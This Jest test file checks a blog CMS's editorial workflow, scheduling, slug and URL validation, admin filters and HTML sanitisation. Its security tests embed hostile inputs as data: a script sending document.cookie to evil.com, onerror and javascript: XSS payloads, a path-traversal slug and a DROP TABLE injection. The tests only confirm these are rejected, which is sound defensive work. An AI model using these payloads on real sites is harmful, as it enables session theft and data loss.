/** Content editor: creating, publishing workflow, scheduling, SEO, sanitizing, deleting. */
const { setup, agent, as, postForm, post, postData, db } = require('../helpers');
const { categories } = require('../../src/models/taxonomy');

let app;
const A = {};
beforeAll(async () => {
  app = setup();
  for (const r of ['contributor', 'author', 'editor']) A[r] = await as(app, r);
});

const lagosLocal = (msFromNow) => new Date(Date.now() + msFromNow + 3600000).toISOString().slice(0, 16);

describe('contributor workflow', () => {
  test('saves a draft, then submits it for review', async () => {
    let res = await postForm(A.contributor, '/admin/posts/new', postData({ title: 'Contributor draft' }), '/admin/posts/new');
    expect(res.status).toBe(302);
    const p = post('Contributor draft');
    expect(p.status).toBe('draft');
    res = await postForm(A.contributor, `/admin/posts/${p.id}/edit`, postData({ title: 'Contributor draft', status: 'review' }), '/admin');
    expect(post('Contributor draft').status).toBe('review');
    expect((await A.editor.get('/admin')).text).toContain('Contributor draft'); // in the editor's review queue
  });

  test('CANNOT publish by tampering with the status field', async () => {
    const res = await postForm(A.contributor, '/admin/posts/new', postData({ title: 'Sneaky publish', status: 'published' }), '/admin/posts/new');
    expect(res.status).toBe(400);
    expect(res.text).toContain('Contributors cannot publish');
    expect(post('Sneaky publish')).toBeUndefined();
    const own = post('Contributor draft');
    expect((await postForm(A.contributor, `/admin/posts/${own.id}/status`, { status: 'published' }, '/admin')).status).toBe(403);
  });

  test('cannot feature a post on the home page', async () => {
    await postForm(A.contributor, '/admin/posts/new', postData({ title: 'Wants to be featured', featured: 'on' }), '/admin/posts/new');
    expect(post('Wants to be featured').featured).toBe(0);
  });

  test('editor publishes the submitted post from the review queue', async () => {
    const p = post('Contributor draft');
    await postForm(A.editor, `/admin/posts/${p.id}/status`, { status: 'published', returnTo: 'dashboard' }, '/admin');
    const live = post('Contributor draft');
    expect(live.status).toBe('published');
    expect(live.published_at).not.toBeNull();
    expect((await agent(app).get(`/posts/${live.slug}`)).status).toBe(200);
  });
});

describe('author workflow', () => {
  test('creates and publishes with category, tags, SEO fields and a cover', async () => {
    const tech = categories.findBySlug('web-development');
    const res = await postForm(A.author, '/admin/posts/new', postData({
      title: 'Hello from the author', status: 'published', categoryId: String(tech.id), tags: 'Tutorials, Brand New Tag',
      featureImage: '/images/covers/ember.jpg', metaTitle: 'SEO title here', metaDescription: 'SEO description here', excerpt: 'Short summary'
    }), '/admin/posts/new');
    expect(res.status).toBe(302);
    const p = post('Hello from the author');
    expect(p.status).toBe('published');
    const page = await agent(app).get(`/posts/${p.slug}`);
    expect(page.text).toContain('<title>SEO title here · Blog.x</title>');
    expect(page.text).toContain('<meta name="description" content="SEO description here">');
    expect(page.text).toContain(`<link rel="canonical" href="http://localhost:3000/posts/${p.slug}">`);
    expect(page.text).toContain('og:image');
    expect(page.text).toContain('href="/tag/brand-new-tag"');
    expect(page.text).toContain('Web Development');
  });

  test('scheduling: a future publish date hides the post until then', async () => {
    await postForm(A.author, '/admin/posts/new', postData({ title: 'Scheduled for later', status: 'published', publishAt: lagosLocal(2 * 86400000) }), '/admin/posts/new');
    const p = post('Scheduled for later');
    expect((await agent(app).get(`/posts/${p.slug}`)).status).toBe(404);
    expect((await A.author.get('/admin/posts?status=scheduled')).text).toContain('Scheduled for later');
    db.prepare("UPDATE posts SET published_at = datetime('now', '-1 minute') WHERE id = ?").run(p.id); // time passes
    expect((await agent(app).get(`/posts/${p.slug}`)).status).toBe(200);
  });

  test('archiving removes a post from the site', async () => {
    const p = post('Hello from the author');
    await postForm(A.author, `/admin/posts/${p.id}/status`, { status: 'archived' }, '/admin');
    expect((await agent(app).get(`/posts/${p.slug}`)).status).toBe(404);
  });

  test('slugs are unique and validated', async () => {
    await postForm(A.author, '/admin/posts/new', postData({ title: 'Welcome to Blog.x' }), '/admin/posts/new');
    const dup = db.prepare("SELECT slug FROM posts WHERE title = 'Welcome to Blog.x' ORDER BY id DESC").get();
    expect(dup.slug).toBe('welcome-to-blog-x-2');
    const bad = await postForm(A.author, '/admin/posts/new', postData({ title: 'Bad slug', slug: '../../etc/passwd' }), '/admin/posts/new');
    expect(bad.status).toBe(400);
  });

  test('validation: short title, unknown category, outside image, javascript: canonical', async () => {
    const res = await postForm(A.author, '/admin/posts/new', postData({ title: 'x', categoryId: '999', featureImage: 'https://evil.com/a.jpg', canonicalUrl: 'javascript:alert(1)' }), '/admin/posts/new');
    expect(res.status).toBe(400);
    expect(res.text).toContain('Title must be at least 3 characters.');
    expect(res.text).toContain('Please choose a category from the list.');
    expect(res.text).toContain('Choose the feature image from the media library.');
    expect(res.text).toContain('Canonical URL must be a full web address');
  });

  test('deletes their own post', async () => {
    const p = post('Scheduled for later');
    await postForm(A.author, `/admin/posts/${p.id}/delete`, {}, '/admin');
    expect(post('Scheduled for later')).toBeUndefined();
  });
});

describe('rich text is sanitized (stored XSS)', () => {
  test('scripts, event handlers and javascript: links are removed before saving', async () => {
    const evil = '<p>Safe text</p><script>document.location="https://evil.com?c="+document.cookie</script>' +
      '<img src=x onerror="alert(1)"><a href="javascript:alert(1)">click</a><p onmouseover="alert(1)">hover</p><iframe src="https://evil.com"></iframe>';
    await postForm(A.author, '/admin/posts/new', postData({ title: 'XSS attempt', status: 'published', contentHtml: evil }), '/admin/posts/new');
    const stored = post('XSS attempt').content_html;
    expect(stored).toBe('<p>Safe text</p><a>click</a><p>hover</p>');
    const page = await agent(app).get(`/posts/${post('XSS attempt').slug}`);
    expect(page.text).not.toMatch(/<script>document|onerror=|javascript:alert|<iframe/);
  });

  test('HTML in titles, excerpts and tags is escaped, not rendered', async () => {
    await postForm(A.author, '/admin/posts/new', postData({ title: '<b>Bold</b> <script>alert(1)</script>', excerpt: '<img src=x onerror=alert(1)>', status: 'published' }), '/admin/posts/new');
    const p = db.prepare("SELECT slug FROM posts WHERE title LIKE '<b>Bold%'").get();
    const page = await agent(app).get(`/posts/${p.slug}`);
    expect(page.text).toContain('&lt;b&gt;Bold&lt;/b&gt; &lt;script&gt;alert(1)&lt;/script&gt;');
    expect(page.text).not.toContain('<script>alert(1)</script>');
    expect(page.text).toContain('&lt;img src=x onerror=alert(1)&gt;');
  });

  test('a rejected form re-displays the content sanitized (no reflected XSS in the editor)', async () => {
    const res = await postForm(A.author, '/admin/posts/new', postData({ title: 'x', contentHtml: '<p>keep</p><script>alert(1)</script>' }), '/admin/posts/new');
    expect(res.status).toBe(400);
    expect(res.text).toContain('&lt;p&gt;keep&lt;/p&gt;');
    expect(res.text).not.toContain('<script>alert(1)</script>');
  });
});

describe('admin post list search and filters', () => {
  test('status, text search, category, author and sort filters', async () => {
    const ed = A.editor;
    expect((await ed.get('/admin/posts?status=draft')).text).toContain('Notes on password managers');
    expect((await ed.get('/admin/posts?status=draft')).text).not.toContain('Ten habits that keep');
    expect((await ed.get('/admin/posts?q=akara')).text).toContain('Saturday morning in Yaba');
    const food = categories.findBySlug('food');
    const byCat = await ed.get(`/admin/posts?category=${food.id}`);
    expect(byCat.text).toContain('Saturday morning in Yaba');
    expect(byCat.text).not.toContain('Ten habits');
    const authorId = db.prepare("SELECT id FROM users WHERE email = 'contributor@blogx.test'").get().id;
    expect((await ed.get(`/admin/posts?author=${authorId}`)).text).not.toContain('Ten habits');
    expect((await ed.get('/admin/posts?sort=title')).status).toBe(200);
    expect((await ed.get("/admin/posts?sort=title;DROP TABLE posts")).status).toBe(200);
  });
});
